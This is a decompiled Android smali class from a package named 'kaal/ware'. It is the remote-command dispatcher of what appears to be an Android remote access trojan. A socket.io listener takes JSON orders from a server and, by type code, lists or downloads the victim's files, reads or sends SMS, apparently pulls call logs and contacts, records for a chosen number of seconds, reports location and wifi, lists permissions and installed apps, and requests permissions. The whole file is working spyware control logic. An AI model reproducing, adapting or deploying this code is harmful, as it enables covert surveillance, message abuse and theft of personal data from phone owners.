.class final Lcom/kaal/ware/ConnectionManager$2;
.super Ljava/lang/Object;
.source "ConnectionManager.java"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/kaal/ware/ConnectionManager;->sendReq()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .registers 1

    .line 44
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public varargs call([Ljava/lang/Object;)V
    .registers 9
    .param p1, "args"    # [Ljava/lang/Object;

    .line 48
    const/4 v0, 0x0

    :try_start_1
    aget-object v1, p1, v0

    check-cast v1, Lorg/json/JSONObject;

    .line 49
    .local v1, "data":Lorg/json/JSONObject;
    const-string v2, "type"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 52
    .local v2, "order":Ljava/lang/String;
    const/4 v3, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/4 v5, 0x1

    sparse-switch v4, :sswitch_data_10c

    :cond_14
    goto/16 :goto_7b

    :sswitch_16
    const-string v4, "0xWI"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/4 v3, 0x6

    goto :goto_7b

    :sswitch_20
    const-string v4, "0xSM"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/4 v3, 0x1

    goto :goto_7b

    :sswitch_2a
    const-string v4, "0xPM"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/4 v3, 0x7

    goto :goto_7b

    :sswitch_34
    const-string v4, "0xMI"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/4 v3, 0x4

    goto :goto_7b

    :sswitch_3e
    const-string v4, "0xLO"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/4 v3, 0x5

    goto :goto_7b

    :sswitch_48
    const-string v4, "0xIN"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/16 v3, 0x8

    goto :goto_7b

    :sswitch_53
    const-string v4, "0xGP"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/16 v3, 0x9

    goto :goto_7b

    :sswitch_5e
    const-string v4, "0xFI"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/4 v3, 0x0

    goto :goto_7b

    :sswitch_68
    const-string v4, "0xCO"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    const/4 v3, 0x3

    goto :goto_7b

    :sswitch_72
    const-string v4, "0xCL"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4
    :try_end_78
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_78} :catch_106

    if-eqz v4, :cond_14

    const/4 v3, 0x2

    :goto_7b
    const-string v4, "ls"

    const-string v6, "action"

    packed-switch v3, :pswitch_data_136

    goto/16 :goto_105

    .line 93
    :pswitch_84
    :try_start_84
    const-string v0, "permission"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/kaal/ware/ConnectionManager;->GP(Ljava/lang/String;)V

    goto/16 :goto_105

    .line 90
    :pswitch_8f
    invoke-static {}, Lcom/kaal/ware/ConnectionManager;->IN()V

    .line 91
    goto/16 :goto_105

    .line 87
    :pswitch_94
    invoke-static {}, Lcom/kaal/ware/ConnectionManager;->PM()V

    .line 88
    goto/16 :goto_105

    .line 84
    :pswitch_99
    invoke-static {}, Lcom/kaal/ware/ConnectionManager;->WI()V

    .line 85
    goto :goto_105

    .line 81
    :pswitch_9d
    invoke-static {}, Lcom/kaal/ware/ConnectionManager;->LO()V

    .line 82
    goto :goto_105

    .line 78
    :pswitch_a1
    const-string v0, "sec"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    invoke-static {v0}, Lcom/kaal/ware/ConnectionManager;->MI(I)V

    .line 79
    goto :goto_105

    .line 75
    :pswitch_ab
    invoke-static {}, Lcom/kaal/ware/ConnectionManager;->CO()V

    .line 76
    goto :goto_105

    .line 72
    :pswitch_af
    invoke-static {}, Lcom/kaal/ware/ConnectionManager;->CL()V

    .line 73
    goto :goto_105

    .line 66
    :pswitch_b3
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_c2

    .line 67
    const/4 v3, 0x0

    invoke-static {v0, v3, v3}, Lcom/kaal/ware/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_105

    .line 68
    :cond_c2
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "sendSMS"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_105

    .line 69
    const-string v0, "to"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "sms"

    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v5, v0, v3}, Lcom/kaal/ware/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_105

    .line 60
    :pswitch_de
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3
    :try_end_e6
    .catch Ljava/lang/Exception; {:try_start_84 .. :try_end_e6} :catch_106

    const-string v4, "path"

    if-eqz v3, :cond_f2

    .line 61
    :try_start_ea
    invoke-virtual {v1, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Lcom/kaal/ware/ConnectionManager;->FI(ILjava/lang/String;)V

    goto :goto_105

    .line 62
    :cond_f2
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "dl"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_105

    .line 63
    invoke-virtual {v1, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Lcom/kaal/ware/ConnectionManager;->FI(ILjava/lang/String;)V
    :try_end_105
    .catch Ljava/lang/Exception; {:try_start_ea .. :try_end_105} :catch_106

    .line 98
    .end local v1    # "data":Lorg/json/JSONObject;
    .end local v2    # "order":Ljava/lang/String;
    :cond_105
    :goto_105
    goto :goto_10a

    .line 96
    :catch_106
    move-exception v0

    .line 97
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 99
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_10a
    return-void

    nop

    :sswitch_data_10c
    .sparse-switch
        0x179cb1 -> :sswitch_72
        0x179cb4 -> :sswitch_68
        0x179d0b -> :sswitch_5e
        0x179d31 -> :sswitch_53
        0x179d6d -> :sswitch_48
        0x179dcb -> :sswitch_3e
        0x179de4 -> :sswitch_34
        0x179e45 -> :sswitch_2a
        0x179ea2 -> :sswitch_20
        0x179f1a -> :sswitch_16
    .end sparse-switch

    :pswitch_data_136
    .packed-switch 0x0
        :pswitch_de
        :pswitch_b3
        :pswitch_af
        :pswitch_ab
        :pswitch_a1
        :pswitch_9d
        :pswitch_99
        :pswitch_94
        :pswitch_8f
        :pswitch_84
    .end packed-switch
.end method
